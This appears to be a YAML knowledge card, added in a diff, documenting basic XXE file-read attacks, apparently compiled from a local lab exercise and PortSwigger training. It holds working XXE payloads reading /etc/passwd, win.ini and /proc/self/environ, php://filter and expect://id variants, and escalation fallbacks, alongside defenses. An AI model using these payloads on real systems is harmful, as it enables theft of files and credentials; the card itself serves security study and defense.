@@ -1,0 +1,116 @@
+# 技术卡片: XXE 基础 - 文件读取
+# 分类: xxe / injection
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: 黑骡自主学习训练（PortSwigger S01 卡片指导）
+
+id: "xxe-basic-file-read"
+name: "XXE - 外部实体文件读取"
+category: "xxe"
+subcategory: "file-read"
+severity: "critical"
+
+description: |
+  当 XML 解析器允许外部实体（External Entities）时，攻击者可通过 DOCTYPE
+  声明引入外部资源。最常见的是 file:// 协议读取服务器本地文件。
+  这是 XXE 最直接、危害最大的利用方式。
+
+trigger_signals:
+  - "应用接受 XML 输入（Content-Type: application/xml 或 text/xml）"
+  - "XML 解析结果部分回显在响应中"
+  - "请求中使用 SOAP、SVG、Office 文档（DOCX/XLSX）等 XML 格式"
+  - "API 文档或 WSDL 暗示 XML 处理"
+  - "错误消息包含 XML 解析器特征（如 lxml、libxml2、Xerces）"
+
+detection_probes:
+  baseline:
+    - probe: |
+        <?xml version="1.0"?><data><name>test</name></data>
+    - note: "建立正常 XML 基线，观察返回结构"
+  
+  entity_test:
+    - probe: |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY test "hello">]>
+        <data><name>&test;</name></data>
+    - expected: "响应中 &test; 被替换为 hello"
+    - note: "关键判定——实体是否被解析替换"
+
+  file_read_test:
+    - probe: |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <data><name>&xxe;</name></data>
+    - expected: "响应包含 /etc/passwd 内容"
+    - note: "用靶场预置的无害文件做最初验证（如 /tmp/xxe_lab/flag.txt）"
+
+  windows_variant:
+    - probe: |
+        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+    - note: "Windows 目标需调整路径分隔符"
+
+payloads:
+  linux_targets:
+    - file: "/etc/passwd"
+      value: "用户列表"
+    - file: "/etc/hostname"
+      value: "主机名"
+    - file: "/proc/self/environ"
+      value: "环境变量（可能含凭据）"
+    - file: "/proc/self/cmdline"
+      value: "启动命令"
+
+  php_targets:
+    - file: "php://filter/convert.base64-encode/resource=index.php"
+      note: "需 PHP expect:// 或特定 wrapper，非标准 XXE"
+    - file: "expect://id"
+      note: "需 PHP expect 扩展加载"
+
+  java_targets:
+    - file: "file:///WEB-INF/web.xml"
+    - file: "file:///WEB-INF/classes/application.properties"
+
+success_indicators:
+  - "响应包含目标文件内容（如 flag、/etc/passwd 行）"
+  - "内容哈希可校验非伪造"
+
+failure_fallback:
+  - "实体未解析 → 测试参数实体（%）"
+  - "外部实体被禁止 → 测试 XInclude"
+  - "file:// 被过滤 → 测试 php:// 或 jar:// 等其他协议"
+  - "无回显 → 转盲 XXE（OOB 回调或错误差异）"
+
+prerequisites:
+  - "XML 解析器未禁用外部实体（load_dtd / resolve_entities）"
+  - "file:// 协议未被过滤"
+  - "响应包含解析后的 XML 内容（至少部分回显）"
+
+parser_behaviors:
+  lxml_6:
+    - version: "lxml 6.1.1 (libxml2 2.14.6)"
+    - file_protocol: "✅ 可用"
+    - http_protocol: "❌ no_network=False 仍不发起 HTTP 请求"
+    - note: "lxml 6.x 在安全方面比 4.x 更严格——网络访问即使显式允许也被限制"
+  
+  python_etree:
+    - note: "标准库 xml.etree.ElementTree 默认禁用外部实体（安全）"
+
+defense:
+  - "禁用 DTD 和外部实体：load_dtd=False, resolve_entities=False"
+  - "使用安全 XML 库：defusedxml（Python）、SAXParser 安全配置（Java）"
+  - "输入验证：拒绝含 DOCTYPE 的 XML 输入"
+  - "使用 JSON 替代 XML（如业务允许）"
+  - "网络分段：即使有 file:// 读取，也应限制解析器进程的文件访问权限"
+
+tools:
+  - "Burp Suite Professional（自动扫描 + Collaborator OOB）"
+  - "curl + 手工 XML payload"
+  - "xxeinjector (https://github.com/enjoiz/XXEinjector)"
+
+sources:
+  - reference: "PortSwigger Web Security Academy - XXE"
+  - reference: "OWASP WSTG v4.2 - WSTG-INPV-07"
+  - reference: "CWE-611"
+  - training: "2026-07-23 黑骡自主学习（Flask + lxml 6.1.1 本地靶场）"
